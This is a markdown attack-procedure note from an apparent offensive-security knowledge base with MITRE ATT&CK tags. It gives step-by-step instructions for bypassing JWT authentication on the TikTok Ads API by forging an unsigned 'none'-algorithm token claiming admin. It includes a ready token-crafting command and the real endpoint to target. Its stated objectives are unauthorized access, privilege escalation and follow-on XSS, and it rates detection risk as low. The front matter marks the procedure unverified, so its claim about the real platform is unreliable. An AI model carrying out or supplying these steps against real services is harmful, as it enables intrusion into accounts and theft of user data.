---
tags:
  - jwt
  - auth-bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/generate-jwt-token]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: d1d2cace-5686-4544-a32f-741c2d9a9336
created_at: '2025-12-14T17:30:58.274Z'
updated_at: '2025-12-14T17:30:58.274Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# JWT-Authentication-Bypass

## Summary

This procedure exploits improper verification of JSON Web Tokens (JWT) in the TikTok Ads platform to bypass authentication, granting unauthorized access to protected resources like ad management and user data.

## Description

JWTs are used for session management, but the platform fails to enforce signature validation, allowing attackers to craft tokens with arbitrary claims (e.g., admin privileges) using the 'none' algorithm. This leads to initial access without valid credentials, enabling further exploitation such as data access or payload injection. The target environment is the web-based TikTok Ads API, requiring only external network access.

## Requirements

1. Access to a JWT crafting library or tool (e.g., jwt-cli)
2. Proxy tool like Burp Suite for request interception
3. Knowledge of target API endpoints (e.g., /api/protected)

## Defense

Defensive measures and detection strategies:

- Enforce strict JWT signature verification and reject 'none' algorithm
- Implement rate limiting on authentication endpoints
- Monitor for anomalous token claims or unsigned JWTs in logs

## Objectives

1. Gain unauthorized access to authenticated resources
2. Escalate privileges via forged claims
3. Enable subsequent attacks like XSS injection

## Instructions

### Step 1: Analyze Legitimate JWT

**Context**: Intercept a valid request to understand the token structure.

Use Burp Suite to capture a login request and decode the JWT at jwt.io.

### Step 2: Craft Malicious JWT

**Context**: Generate an unsigned token with elevated claims.

**Command** ([[commands/generate-jwt-token]]):
```bash
ejwt -alg none -i attacker@example.com -s '' -header '{"typ":"JWT","alg":"none"}' -payload '{"sub":"admin","iat":1234567890,"exp":1234567899}' > malicious.jwt
```

> This creates a token with admin subject and no signature. Expected output: A base64-encoded JWT string saved to file.

### Step 3: Submit Bypassed Request

**Context**: Replace the Authorization header and access protected endpoint.

Intercept with Burp and set `Authorization: Bearer $(cat malicious.jwt)`, then forward to https://ads.tiktok.com/api/protected.

> Successful bypass shows 200 OK with restricted data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/generate-jwt-token]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[jwt]]
- [[auth-bypass]]
